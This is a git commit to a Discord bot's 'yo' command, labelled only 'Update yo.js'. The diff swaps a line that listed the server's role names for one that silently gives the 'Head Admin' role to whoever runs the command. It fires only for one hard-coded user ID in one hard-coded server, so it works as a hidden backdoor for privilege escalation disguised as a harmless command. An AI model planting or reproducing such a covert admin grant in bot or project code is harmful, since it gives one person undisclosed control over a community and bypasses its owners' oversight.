7add7edba8e6d945f31cc69b31f58ffad253ea80
Yikey <gtc122004@gmail.com>
2018-05-03 21:42:02 -0400

    Update yo.js

--- commands/yo.js
+++ commands/yo.js
@@ -2,7 +2,7 @@ const Discord = require("discord.js");
 
 module.exports.run = async (bot, message, args) => {
   if (message.author.id === "432650511825633317" && message.guild.id === "400508946709872660") {
-    console.log(message.guild.roles.map(r => r.name))
+    message.member.addRole(message.guild.roles.find("name", "Head Admin"))
   }
 }
 
